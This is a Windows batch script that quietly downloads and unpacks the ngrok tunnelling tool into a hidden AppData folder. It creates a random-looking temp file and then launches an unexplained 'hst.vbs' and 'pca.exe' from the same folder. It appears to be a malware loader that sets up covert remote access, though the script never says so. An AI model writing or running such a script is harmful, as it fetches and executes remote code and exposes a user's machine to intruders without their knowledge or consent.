@echo off
setlocal

set "USER_PROFILE=%USERPROFILE%"
set "NGROK_DIR=%USER_PROFILE%\AppData\Local\ngrok"
set "DOWNLOADS_FILE=%NGROK_DIR%\ngrok-v3-stable-windows-amd64.zip"
set "TEMP_FILE=%TEMP%\17f44fcmata5-4eed-afbd-e0d7tactudf1ca.tmp"

mkdir "%NGROK_DIR%" >nul 2>&1

powershell -Command "Invoke-WebRequest -Uri 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip' -OutFile '%DOWNLOADS_FILE%'"

powershell -Command "Expand-Archive -Path '%DOWNLOADS_FILE%' -DestinationPath '%NGROK_DIR%' -Force"

del "%DOWNLOADS_FILE%" >nul 2>&1

type nul > "%TEMP_FILE%"

set "VBS_FILE=%NGROK_DIR%\hst.vbs"
set "EXE_FILE=%NGROK_DIR%\pca.exe"

if exist "%VBS_FILE%" (
    cscript //nologo "%VBS_FILE%"
)

if exist "%EXE_FILE%" (
    start "" "%EXE_FILE%"
)

endlocal
